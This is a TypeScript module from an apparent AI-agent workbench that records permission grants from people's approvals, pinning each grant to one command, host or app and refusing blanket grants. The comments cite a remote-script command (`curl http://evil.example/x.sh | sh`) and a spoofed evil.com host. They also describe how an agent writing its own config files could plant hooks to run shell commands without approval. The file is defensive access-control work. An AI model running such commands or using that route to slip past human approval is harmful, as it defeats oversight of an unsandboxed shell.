/**
 * What a person's answer to a card may store, for `PermissionBroker.resolve()`
 * (`../permissions.ts`). A 'chat' or 'always' answer becomes a `Grant` only
 * in the shape derived here from the pending card's own tool and arguments,
 * never as the client sent it: one exact command for a shell 'chat' answer,
 * the card's own host or app for the host-keyed sources and computer use,
 * and nothing at all for the calls that are asked about every time. Anything
 * else throws, and so stores nothing. The other half, whether a stored grant
 * covers a call, is `grant-matching.ts`.
 */
import { randomUUID } from 'node:crypto';
import { classifyAgentTool } from '../agent-tools.js';
import { cardLine } from '../card-text.js';
import { appKey, describeApp, isHighRiskApp } from '../computer-apps.js';
import type { ApprovalChoice } from '../../ports/tool-provider.js';
import type { Grant, Store } from '../../ports/store.js';
import { rawField, stringField } from './fields.js';
import { constraintKeys, hostOfCall, isHostKeyed, isShellTool, type ConstraintKey } from './grant-matching.js';
import type { PendingRequest } from './pending.js';
import { isProtectedAgentWrite } from './sources.js';

/**
 * Stores the grant, if any, that `choice` makes for the `pending` card
 * `resolve()` has just taken off the pending set. See `resolve()` for what
 * each choice means; this throws (and stores nothing) for an answer that
 * can't be stored as sent.
 */
export function persistAnswer(store: Store, pending: PendingRequest, choice: ApprovalChoice): void {
  // Only grantLive makes live grants (spec 2026-10-12-live-artifacts). The
  // route already drops unknown constraint keys; this is defence in depth.
  if (choice.choice === 'always' && choice.constraint?.live !== undefined) {
    throw new Error('Refusing to create an "always" grant with a live constraint: only PermissionBroker.grantLive makes live grants.');
  }

  if (choice.choice === 'deny' || choice.choice === 'once') return;

  // Fail closed: OtherBench cannot know what an unrecognised Claude Code tool does,
  // so it never pre-authorises future calls. 'chat'/'always' act like 'once'.
  if (pending.tool.source === 'agent' && classifyAgentTool(pending.tool.name).category === 'other') return;

  // Likewise for a Claude Code write to its own config files. A grant on
  // `.claude/settings.local.json` (or a `pathPrefix` covering `.claude/`,
  // `.mcp.json` or a CLAUDE.md) would let the model write a hook, a skill's
  // inline shell or an MCP server command that Claude Code then runs on a
  // later turn with no Bash card -- a file grant turned into a shell grant.
  // 'chat'/'always' act like 'once', and decide() never matches a grant for
  // such a write either.
  if (isProtectedAgentWrite(pending.tool, pending.args)) return;

  // Computer use of an app that isn't provably ordinary (a shell, Explorer,
  // a script host, anything unknown) is only ever allowed once. Its card offers
  // nothing else, so a 'chat' or 'always' answer for one is refused out
  // loud and stores nothing; decide() never matches a grant for one either.
  if (pending.tool.source === 'computer') {
    const app = appForGrant(pending);
    if (isHighRiskApp(pending.args)) {
      throw new Error(`Refusing to store a grant for computer use of ${cardLine(describeApp(app)?.name, 80)}: OtherBench asks every time for this app.`);
    }
  }

  if (choice.choice === 'chat') {
    // A 'chat' answer for the shell is NOT a blanket grant for the rest of
    // the chat. `{choice:'chat'}` carries no constraint of its own (the UI
    // offers no field for one), so approving `echo hi` this way used to
    // authorise `curl http://evil.example/x.sh | sh` for the remainder of
    // the chat -- the entire approval gate, and therefore the entire
    // control surface for an unsandboxed shell, gone in one click. The
    // grant is instead pinned to the exact command string that was
    // approved; anything else asks again.
    const constraint = isShellTool(pending.tool)
      ? { commandExact: exactCommandForGrant(pending) }
      : isHostKeyed(pending.tool.source)
        ? { host: hostForGrant(pending) }
        : pending.tool.source === 'computer'
          ? { app: appForGrant(pending) }
          : null;
    store.grants.create({
      id: randomUUID(),
      chatId: pending.ctx.chatId,
      profileId: pending.ctx.profileId,
      toolName: pending.tool.name,
      source: pending.tool.source,
      scope: 'chat',
      constraint,
      expiresAt: null,
    });
    return;
  }

  // choice.choice === 'always': global scope (chatId: null), so it must
  // never be a blanket grant for shell -- shell is unsandboxed, and an
  // unconstrained "always" grant for it would let every future command in
  // every future chat run with no further approval. This check is the
  // code-level enforcement of that project-wide rule; it is NOT redundant
  // with "shell never auto-approves" above, which only guards decide()'s
  // own shortcut and says nothing about a grant a human explicitly created.
  //
  // `isShellTool` rather than `source === 'shell'`: a tool that merely
  // calls itself `run_command` must not be able to mint the very grant the
  // real shell tool is forbidden from having (see SHELL_TOOL_NAMES).
  // A network grant is for one host, like a shell grant is for one command:
  // "always let the sandbox reach anything" is never one click. A browser
  // grant is the same: the one site the card named, never blanket and never
  // a different site than the one the person was shown. No constraint is
  // stored as sent: see alwaysConstraintFor. Likewise for computer use: the
  // grant is for the one app the card named (its key, as the tool's
  // describeCall worked it out), never blanket and never another app.
  const constraint = alwaysConstraintFor(pending, choice.constraint);

  store.grants.create({
    id: randomUUID(),
    chatId: null,
    profileId: pending.ctx.profileId,
    toolName: pending.tool.name,
    source: pending.tool.source,
    scope: 'always',
    constraint,
    expiresAt: null,
  });
}

/** The app a computer grant is pinned to: its key, valid as it stands. Throws rather than store a grant for anything else. */
function appForGrant(pending: PendingRequest): string {
  const app = appKey(rawField(pending.args, 'app'));
  if (app === null) {
    throw new Error('Refusing to create a grant for computer use: the approved call named no app OtherBench could identify.');
  }
  return app;
}

/**
 * The constraint an `'always'` answer is stored with, derived from what the
 * client sent and checked against the pending card's tool; throws (and so
 * stores nothing) for anything else. Never the client's object as sent:
 *
 *   - the network and the browser: exactly `{host}`, naming the card's OWN
 *     host in any spelling, stored canonical -- answering a `pypi.org` card
 *     with `{host: 'evil.com'}` must not mint a grant for evil.com, and a
 *     browser card's "always" covers the site the person was shown and no
 *     other;
 *   - a shell tool (`isShellTool`, which covers the sandboxed `run_command`):
 *     exactly one of `commandExact`/`commandPrefix`, non-empty, trimmed;
 *   - computer use: exactly `{app}`, the card's own app key as it stands
 *     (ruling C4 of the computer-use track) -- never another app, never a
 *     second key, never blanket;
 *   - anything else: a `pathPrefix`, or nothing (an unconstrained grant, as
 *     before). No `host`, `app` or command keys.
 */
function alwaysConstraintFor(pending: PendingRequest, sent: Grant['constraint']): Grant['constraint'] {
  const tool = pending.tool;
  const keys = sent === null || sent === undefined ? [] : constraintKeys(sent);
  if (keys === null) {
    throw new Error(`Refusing to create an "always" grant for "${tool.name}": its constraint has a key OtherBench doesn't know.`);
  }
  const value = (key: ConstraintKey): string => {
    const v = sent?.[key];
    if (typeof v !== 'string' || v.trim() === '') {
      throw new Error(`Refusing to create an "always" grant for "${tool.name}": constraint.${key} must be a non-empty string.`);
    }
    return v.trim();
  };

  if (isHostKeyed(tool.source)) {
    const what = tool.source === 'browser' ? 'the browser' : 'the sandbox network';
    const own = hostForGrant(pending);
    if (keys.length !== 1 || keys[0] !== 'host') {
      throw new Error(`Refusing to create an "always" grant for ${what} that does not name exactly one host, the card's own (${own}), and nothing else.`);
    }
    if (hostOfCall(tool.source, value('host')) !== own) {
      throw new Error(`Refusing to create an "always" grant for ${what}: it must name the card's own host (${own}).`);
    }
    return { host: own };
  }

  if (isShellTool(tool)) {
    const command = keys.filter((k) => k === 'commandExact' || k === 'commandPrefix');
    if (command.length === 0) {
      throw new Error(
        `Refusing to create an unconstrained "always" grant for shell tool "${tool.name}": ` +
          'every always-scope grant for a shell tool must carry a commandPrefix or commandExact constraint.'
      );
    }
    const [key] = command;
    if (keys.length !== 1 || key === undefined) {
      throw new Error(
        `Refusing to create an "always" grant for shell tool "${tool.name}": it may carry exactly one of commandExact or commandPrefix, and nothing else.`
      );
    }
    return key === 'commandExact' ? { commandExact: value(key) } : { commandPrefix: value(key) };
  }

  if (tool.source === 'computer') {
    // The one app the card named, by its key exactly as the tool's
    // describeCall worked it out: another spelling of the same path is
    // another key, and one that isn't a valid key is none.
    const own = appForGrant(pending);
    if (sent?.app === undefined) {
      throw new Error('Refusing to create an unconstrained "always" grant for computer use: it must name the app (constraint.app).');
    }
    if (keys.length !== 1 || keys[0] !== 'app') {
      throw new Error(`Refusing to create an "always" grant for computer use that names anything but the card's own app (${own}).`);
    }
    if (appKey(sent.app) !== own) {
      throw new Error(`Refusing an "always" grant for computer use that doesn't name the app the card asked about (${own}).`);
    }
    return { app: own };
  }

  // A media grant covers the tool and nothing narrower: no constraint to send.
  if (tool.source === 'media' && keys.length > 0) {
    throw new Error(`Refusing to create an "always" grant for the media tool "${tool.name}": it takes no constraint.`);
  }

  if (keys.some((k) => k !== 'pathPrefix')) {
    throw new Error(`Refusing to create an "always" grant for "${tool.name}": only a pathPrefix constraint applies to it.`);
  }
  if (keys.length === 0) {
    // An object setting no keys is malformed rather than a request for a
    // blanket grant: before this check it was stored and matched nothing.
    if (sent !== null && sent !== undefined) {
      throw new Error(`Refusing to create an "always" grant for "${tool.name}": its constraint sets no keys.`);
    }
    return null;
  }
  // As sent (existing behaviour): a path is resolved through containPath when matched.
  const pathPrefix = sent?.pathPrefix;
  if (typeof pathPrefix !== 'string') {
    throw new Error(`Refusing to create an "always" grant for "${tool.name}": constraint.pathPrefix must be a string.`);
  }
  return { pathPrefix };
}

/**
 * The exact command string a `'chat'`-scope shell grant is pinned to.
 *
 * Throws rather than falling back to an unconstrained grant if the pending
 * call had no usable `command` argument: "we could not work out what was
 * approved" must never resolve to "approve everything" for a tool with no
 * containment of its own. The caller (`resolve()`) lets this propagate, so
 * the grant is simply not created and the next call asks again.
 */
function exactCommandForGrant(pending: PendingRequest): string {
  const command = stringField(pending.args, 'command');
  if (command === null || command.trim() === '') {
    throw new Error(
      `Refusing to create a "chat"-scope grant for shell tool "${pending.tool.name}": the approved call carried ` +
        'no "command" string to pin the grant to, and a shell grant must never be unconstrained.'
    );
  }
  return command.trim();
}

/** The canonical host a network or browser grant is pinned to. Throws when the call named none, so no unpinned grant is ever stored. */
function hostForGrant(pending: PendingRequest): string {
  const host = hostOfCall(pending.tool.source, stringField(pending.args, 'host'));
  if (host === null) {
    throw new Error(
      pending.tool.source === 'browser'
        ? 'Refusing to create a grant for the browser: the approved call named no website to pin it to.'
        : 'Refusing to create a grant for the sandbox network: the approved call named no valid host.'
    );
  }
  return host;
}
